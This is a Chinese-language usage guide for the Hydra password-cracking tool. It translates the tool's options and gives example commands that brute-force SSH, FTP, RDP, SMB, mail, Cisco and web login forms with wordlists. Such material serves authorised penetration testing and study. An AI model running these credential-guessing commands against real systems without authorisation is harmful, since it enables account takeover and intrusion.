# Hydra 翻译和使用

Hydra是一个猜测/破解有效登录/密码对的工具

## 语法

```linux
hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]
```

## 选项

```linux
-R                    # 恢复先前中止/崩溃的会话
-I                    # 忽略现有的还原文件(不要等待10秒)
-S                    # 执行SSL连接
-s PORT               # 如果服务位于另一个默认端口，请在这里定义它
-l LOGIN or -L FILE   # 使用登录名登录，或从文件中加载多个登录
-p PASS  or -P FILE   # 尝试密码传递，或从文件中加载多个密码
-x MIN:MAX:CHARSET    # 生成密码蛮力，键入“-x -h”以获得帮助
-y                    # 在蛮力破解中禁用符号，请参见上面
-e nsr                # 尝试“n”空密码，“s”登录作为通行证和/或“r”反向登录
-u                    # 循环使用用户，而不是密码(有效!隐含- x)
-C FILE               # 冒号分隔的“login:pass”格式，而不是-L/-P选项
-M FILE               # 要攻击的服务器列表，每行一个条目，':'指定端口
-o FILE               # 将找到的登录/密码对写入文件而不是输出
-b FORMAT             # 指定-o文件的格式:text(默认)、json、jsonv1
-f / -F               # 找到登录/传递对时退出(-M: -f每个主机，-f全局)
-t TASKS              # 每个目标并行运行任务连接数(默认值:16)
-T TASKS              # 总体上并行地运行任务连接(对于-M，默认值:64)
-w / -W TIME          # 等待响应的时间(32)/每个线程之间的连接(0)
-c TIME               # 所有线程每次登录尝试的等待时间(强制执行'-t 1')
-4 / -6               # 使用IPv4(默认)/ IPv6地址(把常常放在[]里，也放在-M里)
-v / -V / -d          # 详细模式/显示登录+每次尝试/调试模式通过
-O                    # 使用旧的SSL v2和v3
-q                    # 不要打印关于连接错误的消息
-U                    # 服务模块使用明细
-h                    # 更多命令行选项(完整帮助)
server                # 目标:DNS、IP或192.168.0.0/24(或使用 -M 选项)
service               # 要破解的服务(参见下面支持的协议)
OPT                   # 一些服务模块支持额外的输入(-U表示模块帮助)
```

## 支持服务

```linux
adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
```

## 使用环境变量进行代理设置

```linux
E.g. :
% export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
% export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
% export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
% export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
```

## 例子

```linux
hydra -l user -P passlist.txt ftp://192.168.0.1
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
hydra -l admin -p password ftp://[192.168.0.0/24]/
hydra -L logins.txt -P pws.txt -M targets.txt ssh

1、破解ssh：
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh

2、破解ftp：
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV

3、get方式提交，破解web登录：
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php

4、post方式提交，破解web登录：
hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>"
（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,<title>中的内容是表示错误猜解的返回信息提示。）

5、破解https：
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https

6、破解teamspeak：
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak

7、破解cisco：
hydra -P pass.txt 10.36.16.18 cisco
hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable

8、破解smb：
hydra -l administrator -P pass.txt 10.36.16.18 smb

9、破解pop3：
hydra -l muts -P pass.txt my.pop3.mail pop3

10、破解rdp：
hydra ip rdp -l administrator -P pass.txt -V

11、破解http-proxy：
hydra -l admin -P pass.txt http-proxy://10.36.16.18

12、破解imap：
hydra -L user.txt -p secret 10.36.16.18 imap PLAIN
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
```
